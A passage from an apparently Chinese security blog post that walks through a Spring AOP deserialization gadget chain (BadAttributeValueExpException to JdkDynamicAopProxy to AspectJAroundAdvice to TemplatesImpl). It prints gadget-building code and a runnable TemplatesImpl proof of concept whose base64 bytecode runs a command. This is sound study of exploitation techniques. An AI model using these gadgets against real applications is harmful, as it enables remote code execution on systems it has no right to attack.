serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们发现该构造函数的作用是将传入的 <code>val</code> 参数转换为<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，并将结果赋值给 <code>this.val</code> 成员变量。这样做是为了在创建 <code>BadAttributeValueExpException</code> 对象时，确保 <code>this.val</code> 始终是一个字符串值</p><p>而readObject这个函数的作用是通过 <code>gf.get(&quot;val&quot;, null)</code> 方法获取名为 “val” 的字段对应的值，赋给 valObj，如果其不为String，则强行调用toString。而在上面代码我们是赋值了一个proxy2。他是一个对象。所以这里会触发tostring。也就是proxy2.tosring()</p><p>这个tostring函数触发了有什么用呢。这个函数肯定没什么用(。重点在proxy2。</p><p>想理解proxy2我们来看这两段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy2</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy2</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy2, Map.class);</span><br></pre></td></tr></table></figure><p>接下来看一下他们的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(InvocationHandler handler, Class... classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> java.lang.reflect.Proxy.newProxyInstance(Proxy.class.getClassLoader(), classes, handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//JdkDynamicAopProxyNode.makeGadget(&quot;ape1ron&quot;,advisedSupport);对应的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(Object object,AdvisedSupport as)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    as.setTargetSource(<span class="keyword">new</span> <span class="title class_">SingletonTargetSource</span>(object));</span><br><span class="line">    <span class="keyword">return</span> Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>,AdvisedSupport.class,as);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Object proxy2 &#x3D; Proxy.<em>makeGadget</em>(jdkDynamicAopProxy2, Map.class);这段代码的作用是给jdkDynamicAopProxy2对象添加一个额外的接口。这个接口是Map。(实现这个接口的作用是为了绕过BadAttributeValueExpException的readobject里的if检查。这样的方法在cc5链里也有。感兴趣的可以去搜搜看(笔者也只是猜测。没深入追代码。因为这个点不是本文的核心重点))</p><p>InvocationHandler jdkDynamicAopProxy2 &#x3D; (InvocationHandler) JdkDynamicAopProxyNode.<em>makeGadget</em>(“ape1ron”,advisedSupport);这段代码的意思是</p><p>通过 <code>JdkDynamicAopProxy</code> 创建了一个<strong>JDK 动态代理对象</strong>。</p><p>这个代理对象会拦截所有对 apr1ron 的方法调用，并通过 <code>AdvisedSupport</code> 里的拦截器链处理。</p><p>关于拦截方法和自定义的逻辑这方面下面有个简单案例1可以参考</p><p>关于上面这段逻辑是由org.springframework.aop.framework.JdkDynamicAopProxy下的invoke函数里的逻辑就是这个</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">equalsDefined</span> || !<span class="title class_">AopUtils</span>.<span class="title function_">isEqualsMethod</span>(method)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">hashCodeDefined</span> &amp;&amp; <span class="title class_">AopUtils</span>.<span class="title function_">isHashCodeMethod</span>(method)) &#123;</span><br><span class="line">            <span class="title class_">Integer</span> var19 = <span class="variable language_">this</span>.<span class="title function_">hashCode</span>();</span><br><span class="line">            <span class="keyword">return</span> var19;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method.<span class="title function_">getDeclaringClass</span>() == <span class="title class_">DecoratingProxy</span>.<span class="property">class</span>) &#123;</span><br><span class="line">            <span class="title class_">Class</span> var18 = <span class="title class_">AopProxyUtils</span>.<span class="title function_">ultimateTargetClass</span>(<span class="variable language_">this</span>.<span class="property">advised</span>);</span><br><span class="line">            <span class="keyword">return</span> var18;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">advised</span>.<span class="property">opaque</span> &amp;&amp; method.<span class="title function_">getDeclaringClass</span>().<span class="title function_">isInterface</span>() &amp;&amp; method.<span class="title function_">getDeclaringClass</span>().<span class="title function_">isAssignableFrom</span>(<span class="title class_">Advised</span>.<span class="property">class</span>)) &#123;</span><br><span class="line">            <span class="title class_">Object</span> var17 = <span class="title class_">AopUtils</span>.<span class="title function_">invokeJoinpointUsingReflection</span>(<span class="variable language_">this</span>.<span class="property">advised</span>, method, args);</span><br><span class="line">            <span class="keyword">return</span> var17;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">advised</span>.<span class="property">exposeProxy</span>) &#123;</span><br><span class="line">            oldProxy = <span class="title class_">AopContext</span>.<span class="title function_">setCurrentProxy</span>(proxy);</span><br><span class="line">            setProxyContext = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        target = targetSource.<span class="title function_">getTarget</span>();</span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; targetClass = target != <span class="literal">null</span> ? target.<span class="title function_">getClass</span>() : <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">List</span>&lt;<span class="title class_">Object</span>&gt; chain = <span class="variable language_">this</span>.<span class="property">advised</span>.<span class="title function_">getInterceptorsAndDynamicInterceptionAdvice</span>(method, targetClass);</span><br><span class="line">        <span class="title class_">Object</span> retVal;</span><br><span class="line">        <span class="keyword">if</span> (chain.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">            <span class="title class_">Object</span>[] argsToUse = <span class="title class_">AopProxyUtils</span>.<span class="title function_">adaptArgumentsIfNecessary</span>(method, args);</span><br><span class="line">            retVal = <span class="title class_">AopUtils</span>.<span class="title function_">invokeJoinpointUsingReflection</span>(target, method, argsToUse);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">MethodInvocation</span> invocation = <span class="keyword">new</span> <span class="title class_">ReflectiveMethodInvocation</span>(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.<span class="title function_">proceed</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; returnType = method.<span class="title function_">getReturnType</span>();</span><br><span class="line">        <span class="keyword">if</span> (retVal != <span class="literal">null</span> &amp;&amp; retVal == target &amp;&amp; returnType != <span class="title class_">Object</span>.<span class="property">class</span> &amp;&amp; returnType.<span class="title function_">isInstance</span>(proxy) &amp;&amp; !<span class="title class_">RawTargetAccess</span>.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(method.<span class="title function_">getDeclaringClass</span>())) &#123;</span><br><span class="line">            retVal = proxy;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retVal == <span class="literal">null</span> &amp;&amp; returnType != <span class="title class_">Void</span>.<span class="property">TYPE</span> &amp;&amp; returnType.<span class="title function_">isPrimitive</span>()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;Null return value from advice does not match primitive return type for: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Object</span> var12 = retVal;</span><br><span class="line">        <span class="keyword">return</span> var12;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们发现拦截器链如果不为空就会执行拦截器链里的拦截器写的逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chain.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">            <span class="title class_">Object</span>[] argsToUse = <span class="title class_">AopProxyUtils</span>.<span class="title function_">adaptArgumentsIfNecessary</span>(method, args);</span><br><span class="line">            retVal = <span class="title class_">AopUtils</span>.<span class="title function_">invokeJoinpointUsingReflection</span>(target, method, argsToUse);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">MethodInvocation</span> invocation = <span class="keyword">new</span> <span class="title class_">ReflectiveMethodInvocation</span>(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.<span class="title function_">proceed</span>();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>扯了这么多把上面的内容</p><p>接下来再重新总结一下这段代码的作用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">InvocationHandler</span> jdkDynamicAopProxy2 = (<span class="title class_">InvocationHandler</span>) <span class="title class_">JdkDynamicAopProxyNode</span>.<span class="title function_">makeGadget</span>(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line"><span class="title class_">Object</span> proxy2 = <span class="title class_">Proxy</span>.<span class="title function_">makeGadget</span>(jdkDynamicAopProxy2, <span class="title class_">Map</span>.<span class="property">class</span>);</span><br><span class="line"><span class="title class_">Object</span> badAttrValExe = <span class="title class_">BadAttrValExeNode</span>.<span class="title function_">makeGadget</span>(proxy2);</span><br></pre></td></tr></table></figure><p>这段代码创建了一个代理。这个代理的目标对象是一个ape1ron的字符串。在执行这个目标对象的函数之前会先执行拦截器链的代码。所以这里的字符串是什么都无所谓。因为我们是通过拦截器链进行恶意逻辑触发的。</p><p>创建同时实现Spring AOP代理接口和Map接口的代理对象。proxy2.tostring()-&gt;jdkDynamicAopProxy2.tostring()-&gt;advisedSupport-&gt;”ape1ron”.tostring()。但是在tostring之前会先执行拦截器链里的代码</p><p>接下来开始分析advisedSupport这个拦截器链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Advisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultIntroductionAdvisor</span>((Advice) proxy1);</span><br><span class="line">List&lt;Advisor&gt; advisors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">advisors.add(advisor);</span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisors&quot;</span>,advisors);</span><br><span class="line"><span class="type">DefaultAdvisorChainFactory</span> <span class="variable">advisorChainFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAdvisorChainFactory</span>();</span><br><span class="line">Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisorChainFactory&quot;</span>,advisorChainFactory)</span><br></pre></td></tr></table></figure><p>把proxy1封装起来变成拦截器</p><p>然后添加一个chain。正常情况下是直接用addadvise()添加拦截器的。但是会受到spring安全检查约束。所以这里是这么写</p><table><thead><tr><th>场景</th><th>直接 addAdvice()</th><th>通过 Advisor + 反射注入</th></tr></thead><tbody><tr><td>用途</td><td>添加简单的方法拦截逻辑</td><td>动态引入接口或精细控制拦截范围</td></tr><tr><td>安全校验</td><td>受 Spring 安全检查约束</td><td>绕过安全检查，直接操作底层字段</td></tr><tr><td>灵活性</td><td>只能添加通用的 Advice</td><td>可注入任意 Advisor（包括恶意实现）</td></tr><tr><td>典型场景</td><td>正常业务逻辑（如日志、事务）</td><td>漏洞利用（如反序列化攻击、内存马注入）</td></tr></tbody></table><p><strong>DefaultAdvisorChainFactory</strong> 是 Spring AOP 中的一个工厂类，用于根据 AdvisedSupport 中配置的 Advisor 列表和目标方法，构造出一个有序的拦截器链。</p><p>这样，AdvisedSupport 不仅知道有哪些 Advisor，还知道如何将它们按正确顺序组装成拦截器链。</p><p>ok接下来只剩下proxy1需要分析了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> getAspectJAroundAdvice(cmd);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy1</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(aspectJAroundAdvice);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy1</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy1, Advisor.class, MethodInterceptor.class);</span><br></pre></td></tr></table></figure><p>我们可以发现proxy1是一个jdkDynamicAopProxy1的基础上同时又接入了Advisor, MethodInterceptor这两个接口的</p><p>一个实例</p><p>jdkDynamicAopProxy1是一个代理对象。拦截器链是空的。直达对象aspectJAroundAdvice</p><p>最后就是分析第一行这个函数了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> AspectJAroundAdvice <span class="title function_">getAspectJAroundAdvice</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> TemplatesImplNode.makeGadget(cmd);</span><br><span class="line">        <span class="type">SingletonAspectInstanceFactory</span> <span class="variable">singletonAspectInstanceFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(templatesImpl);</span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;aspectInstanceFactory&quot;</span>,singletonAspectInstanceFactory);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;declaringClass&quot;</span>, TemplatesImpl.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;parameterTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//        Method targetMethod = Reflections.getMethod(TemplatesImpl.class,&quot;newTransformer&quot;,new Class[0]);</span></span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(aspectJAroundAdvice,&quot;aspectJAdviceMethod&quot;,targetMethod);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJExpressionPointcut</span> <span class="variable">aspectJExpressionPointcut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>();</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;pointcut&quot;</span>,aspectJExpressionPointcut);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointStaticPartArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> aspectJAroundAdvice;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/CVE-Lemon/p/18402114">https://www.cnblogs.com/CVE-Lemon/p/18402114</a></p><p>简单讲一下TemplatesImplNode。详细可以看上面的文章讲的很好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() --&gt;                        <span class="keyword">public</span></span><br><span class="line">TemplatesImpl#getTransletInstance() --&gt;                <span class="keyword">private</span></span><br><span class="line">TemplatesImpl#defineTransletClasses() --&gt;        <span class="keyword">private</span></span><br><span class="line">TransletClassLoader#defineClass()                        <span class="keyword">default</span></span><br></pre></td></tr></table></figure><p>核心通过defineClass加载恶意的字节码实现危害也就是任意代码的执行。</p><p>直接看完整的poc也是很好理解的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LearnTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABtMZWFyblRlbXBsYXRlSW1wbEJ5dGVzLmphdmEMAA4ADwcAHAwAHQAeAQAEY2FsYwwAHwAgAQAWTGVhcm5UZW1wbGF0ZUltcGxCeXRlcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEwAEABQADQAVAAsAAAAEAAEAEAABABEAAAACABI=&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;随便&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看aspectJAroundAdvice这段代码</p><p>下面这段请仔细看注解。写好了详细的意思。如果不懂什么是切点表达式可以搜一下aspectJAroundAdvice的常见用法和简单案例就可以看懂。我也备好了。在下面的简单案例2和简单案例3</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">AspectJAroundAdvice aspectJAroundAdvice <span class="operator">=</span> Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;aspectInstanceFactory&quot;,singletonAspectInstanceFactory);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;declaringClass&quot;, TemplatesImpl.class);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;methodName&quot;, &quot;newTransformer&quot;);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;parameterTypes&quot;, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>上面这段代码解释：</span><br><span class="line">创建一个单例切面工厂，将切面实例绑定到 templatesImpl</span><br><span class="line">当 Spring AOP 执行切面逻辑时，会通过 SingletonAspectInstanceFactory.getAspectInstance() 获取切面实例。</span><br><span class="line">由于工厂绑定的是 templatesImpl，因此实际返回的切面实例就是 templatesImpl。</span><br><span class="line">绕过构造函数直接实例化 AspectJAroundAdvice 对象（避免依赖注入校验）</span><br><span class="line">指定拦截方法为 newTransformer（关键触发点）</span><br><span class="line">AspectJExpressionPointcut aspectJExpressionPointcut <span class="operator">=</span> <span class="keyword">new</span> AspectJExpressionPointcut();</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;pointcut&quot;,aspectJExpressionPointcut);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;joinPointArgumentIndex&quot;,<span class="number">-1</span>);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;joinPointStaticPartArgumentIndex&quot;,<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> aspectJAroundAdvice;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>上面这段代码解释：</span><br><span class="line">设置方法参数类型为空（匹配无参方法）</span><br><span class="line">未设置切点表达式（如 execution(...)），导致默认匹配所有方法。</span><br><span class="line">避免处理 JoinPoint 参数，简化攻击逻辑，防止因参数不匹配导致异常。</span><br></pre></td></tr></table></figure><p>所以通过未设置切点表达式导致默认匹配所有方法。当任意一个方法被调用的时候就会被拦截并且转到切面实例里的指定的newTransformer拦截方法</p><p>然后实现上面所说的利用链</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() <span class="comment">--&gt;                        public</span></span><br><span class="line">TemplatesImpl#getTransletInstance() <span class="comment">--&gt;                private</span></span><br><span class="line">TemplatesImpl#defineTransletClasses() <span class="comment">--&gt;        private</span></span><br><span class="line">TransletClassLoader#defineClass()                        <span class="keyword">default</span></span><br></pre></td></tr></table></figure><h3 id="简单案例1："><a href="#简单案例1：" class="headerlink" title="简单案例1："></a>简单案例1：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义业务接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">BusinessService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">executeTask</span><span class="params">()</span>;</span><br><span 